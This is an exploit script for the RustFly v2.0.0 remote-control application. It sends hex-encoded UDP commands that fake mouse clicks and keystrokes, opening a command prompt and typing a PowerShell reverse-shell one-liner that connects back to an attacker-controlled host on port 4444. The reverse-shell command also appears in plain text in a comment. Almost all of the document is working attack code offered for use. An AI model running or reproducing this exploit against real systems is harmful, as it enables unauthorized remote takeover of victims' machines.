# Exploit Title: RustFly v2.0.0- Remote Code Execution (RCE) 
# Date: 2025-05-29
# Exploit Author: tmrswrr
# Software Link: https://bixat.dev/products/rustfly
# Platform: Multiple 
# Version: v2.0.0
# Tested on: Windows 10


#powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('192.168.1.110',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1;$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)}"


import socket
import time

target_ip = "192.168.1.107"
target_port = 5005

messages = [
    "6D6F76653A2D35352C31303530",  # move:-55,1050
    "646F75626C655F636C69636B",     # double_click
    "746578743A636D64",             # text:cmd
    "6B65793A656E746572",           # key:enter
  
"746578743A706F7765727368656C6C202D6E6F70202D63202224633D4E65772D4F626A6563742053797374656D2E4E65742E536F636B6574732E544350436C69656E7428273139322E3136382E312E313130272C34343434293B24733D24632E47657453747265616D28293B5B627974655B5D5D24623D302E2E36353533357C257B307D3B7768696C65282824693D24732E526561642824622C302C24622E4C656E6774682929202D6E652030297B3B24643D284E65772D4F626A656374202D547970654E616D652053797374656D2E546578742E4153434949456E636F64696E67292E476574537472696E672824622C302C2469293B24723D69657820246420323E26313B24732E577269746528284E65772D4F626A656374202D547970654E616D652053797374656D2E546578742E4153434949456E636F64696E67292E4765744279746573282472202B20275053203E2027292C302C282472202B20275053203E2027292E4C656E677468297D22",
    "6B65793A656E746572",           # key:enter
]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("", 0))     
sock.settimeout(5)

try:
    for msg in messages:
        sock.sendto(bytes.fromhex(msg), (target_ip, target_port))
        print(f"[+] Sent: {bytes.fromhex(msg).decode('ascii', errors='ignore')}")
        time.sleep(1)

except socket.timeout:
    print("[-] Timeout.")

finally:
    sock.close()


